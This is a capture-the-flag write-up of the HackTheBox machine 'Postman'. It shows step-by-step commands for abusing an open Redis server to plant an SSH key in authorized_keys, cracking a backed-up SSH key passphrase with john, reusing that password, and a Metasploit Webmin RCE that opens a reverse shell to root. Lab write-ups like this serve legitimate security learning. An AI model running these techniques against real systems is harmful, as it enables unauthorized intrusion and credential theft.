---
title: HackTheBox Postman
author: Marius Kimmina
date: 2020-03-14 14:10:00 +0800
categories: [CTF, HackTheBox]
tags: [Linux, Redis, Webminn]
published: true
---

# 0x0 Introduction
My first post on a HTB machine and the second Box I managed to own (the first one is yet to retire so there will also be writeup for that) featuring redis and webmin.
![image](/images/Postman_htb.png "Postman Logo")


# 0x1 Getting a foothold

As usual we start the box with an nmap scan
```
nmap -sV -sC -oA nmap/nmap 10.10.10.160
```
This revealed a webmin instance on version 1.1910 which has a privilege escalation vulnerability, but we need to be a user first to use that.
Everything else revealed on this first scan did not seem all that interesting so I went for a second, larger, scan.
```
nmap -p- -o nmap-all 10.10.10.10.160
```
Once that finished it revealed that redis was running on port 6379. Redis is a NoSQL Database that works with key-value-pairs, and there are multiple exploits known for it, so that makes a good target.
To work with redis we need to install the redis-tools:
```
sudo apt get install redis-tools
```
I followed a simple exploit (found here: https://book.hacktricks.xyz/pentesting/6379-pentesting-redis) to replace redis's ssh key with our own, first we need to create an ssh-key of our own.

```
ssh-keygen -t rsa
```

Then wrote the public-key fo a file

```
(echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > pub.txt
```

Next I imported the key into redis

```
cat pub.txt | redis-cli -h 10.10.10.160 -x set s-key
```

And then we place that key for the redis-user:

```
mindslave@kalibox:~/hackthebox/Postman/redis$ redis-cli -h 10.10.10.160
10.10.10.160:6379> CONFIG GET dir
1) "dir"
2) "/var/lib/redis"
10.10.10.160:6379> CONFIG SET dir /var/lib/redis/.ssh
OK
10.10.10.160:6379> CONFIG SET dbfilename authorized_keys
OK
10.10.10.160:6379> save
OK
```

Now we can ssh into the box as "redis" using our private ssh-key that we generated before.

```
redis@Postman:~$
```

# 0x2 Getting the user.txt

First I found out that user "Matt" existed on the system by doing a simple

```
ls /home
```

Then after enumerating the box for a while (looking for all sorts of interesting files/services/stuff that could lead us further).
I came across the /opt/backup directory and backups are of course always something to look for. In the backup directory was a file called id_rsa.bak, I copied the key to my host maschine and asked my friend john if he knew something about it. First we had to use the ssh2john.py to convert the ssh-key into a format that john can work with.

```
mindslave@kalibox:~/hackthebox/Postman/ssh$ /usr/share/john/ssh2john.py id_rsa > johnfile.txt
```

```
mindslave@kalibox:~/hackthebox/Postman/ssh$ john --wordlist=/usr/share/wordlists/rockyou.txt johnfile.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 8 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa)
Warning: Only 2 candidates left, minimum 8 needed for performance.
1g 0:00:00:04 DONE (2020-02-09 07:01) 0.2074g/s 2975Kp/s 2975Kc/s 2975KC/sa6_123..*7¡Vamos!
Session completed
```

Now we have the ssh-key and we know that the password for the key is "computer2008" but this is where this box got a little bit weird. When we tried to connect to the box as matt with the ssh-key and password we get a "connection closed" immediately, which had me confused for a couple of hours. Back on the redis-user, looking at the ssh-config (/etc/ssh/ssh_config and etc/ssh/sshd_config) I found the following line:

```
DenyUsers Matt
```

And honestly, if Matt is not allowed to connect via ssh, why does he even have an ssh-key? And a backup of that key even.
But well it turned out that Matt is not very good with passwords and reused the key password as his local password, so we could just

```
redis@Postman:~$ su Matt
Password:
Matt@Postman:/var/lib/redis$
```

and then we had access to the user.txt in Matt's home directory


# 0x3 Getting the root.txt

To get the root user we had to go back to the webmin instance that we found earlier. Matt was also registered there and of course he used the same password "computer2008" for that as well. Knowing that we could use the privilege escalation exploit that I mentioned earlier.
While I generally prefer to do things without Metasploit, sometimes it is just too convenient. So I entered Matts credentials and set the RHOSTS RPORT LHOST and LPORT Parameter and fired.

```
msf5 exploit(linux/http/webmin_packageup_rce) > exploit

[*] Started reverse TCP handler on 10.10.14.87:9666
[+] Session cookie: cf236dc0067d4ca9410f89e64b2bb62d
[*] Attempting to execute the payload...
[*] Command shell session 1 opened (10.10.14.87:9666 -> 10.10.10.160:45232) at 2020-02-09 10:17:54 +0100
whoami
root
cat /root/root.txt
a257741c5bed8be7778c6ed95686ddce
```

# 0x4 Closing words

This way my second box on HTB (probably the first one I get to post about tho, since it will retire first), and I learned quite a lot from it, especially the whole redis part that had an unnatural place for an .ssh folder to be. Thanks to the Author a great box for new people in the hacking field.
